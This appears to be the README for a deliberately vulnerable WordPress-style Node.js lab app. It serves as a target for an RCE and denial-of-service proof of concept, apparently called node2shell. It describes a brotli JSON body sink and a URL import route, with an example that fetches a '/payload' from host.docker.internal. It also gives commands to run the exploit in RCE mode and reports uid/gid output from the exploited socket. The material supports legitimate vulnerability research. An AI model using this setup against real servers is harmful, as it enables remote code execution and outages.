# WordPress-style CMS lab

`lab/wp-cms` is a Node.js application shaped like a small WordPress
installation. It is not WordPress, it does not run PHP, and it has no database.
The shape exists to place the decoder sink behind a realistic publishing
workflow.

## Stack

| Item | Value |
| --- | --- |
| Runtime | Node.js v24.22.0 |
| Framework | Express 5.3.0 |
| Parser | body-parser 2.4.0, route-scoped `express.json()` |
| User | `node` (uid 1000) |
| Container port | 3000 |
| Host port | 3000 |

## Pages

| Route | Description |
| --- | --- |
| `GET /` | Server-rendered front page with three posts |
| `GET /p/:slug/` | Single post |
| `GET /wp-admin/` | Dashboard |
| `GET /wp-admin/media` | Add Media form |
| `GET /wp-admin/import` | Import from URL form |
| `GET /wp-json/` | REST index |
| `GET /wp-json/wp/v2/posts` | Post collection |
| `GET /wp-json/wp/v2/posts/:id` | Single post |

The admin bar, sidebar, footer, and dark stylesheet live in `src/views/` and
`src/public/`. HTML is not embedded in `server.js`.

## Sinks

### Media body

```text
POST /wp-json/wp/v2/media
Content-Type: application/json
Content-Encoding: br
```

The route attaches `express.json()` with default options:

```js
app.post('/wp-json/wp/v2/media', express.json(), handler);
```

No parser or body middleware runs before it on that path. This preserves the
shape of the verified reference profile.

### Import by URL

```text
POST /wp-json/node2shell/v1/import
Content-Type: application/json

{"url":"http://host.docker.internal:4000/payload"}
```

The server fetches the URL and reads the complete response. Only
`127.0.0.1`, `localhost`, and `host.docker.internal` are accepted.

## Verified results

| Claim | Runs | Result | Evidence |
| --- | ---: | --- | --- |
| RCE | 2/2 | Fresh `uid=` and `gid=` on the exploited socket; successful attempts 1 and 1 | [run 1](../../docs/evidence/wp-cms-rce-run1.txt) · [run 2](../../docs/evidence/wp-cms-rce-run2.txt) |
| DoS | 2/2 | 4/4 health checks failed | [run 1](../../docs/evidence/wp-cms-dos-run1.txt) · [run 2](../../docs/evidence/wp-cms-dos-run2.txt) |
| Patched control | 1/1 | Failed closed with `ERR__ERROR_FORMAT_BLOCK_SWITCH`, health `PONG` | [control](../../docs/evidence/wp-cms-patched-control.txt) |

The RCE claim is limited to this exact application, image, package lock,
one-worker configuration, accepted socket descriptor, and supervisor.

## Run

```bash
docker build -t node2shell-lab:wp-24.22.0 -f lab/wp-cms/Dockerfile lab/wp-cms
docker run --rm -d --name n2s-wp -e N2S_SUPERVISE=1 -e UV_THREADPOOL_SIZE=1 \
  -p 127.0.0.1:3000:3000 node2shell-lab:wp-24.22.0
python poc.py --profile n2s-wp-24.22.0-x86_64 --mode rce
```

For the DoS check, omit `N2S_SUPERVISE=1` and use `--mode dos`.

## Patched control

```bash
docker build -t node2shell-lab:wp-24.22.1 -f lab/wp-cms/Dockerfile.patched lab/wp-cms
docker run --rm -d --name n2s-wp-patched -p 127.0.0.1:3000:3000 node2shell-lab:wp-24.22.1
python poc.py --profile n2s-wp-patched-24.22.1-x86_64
```
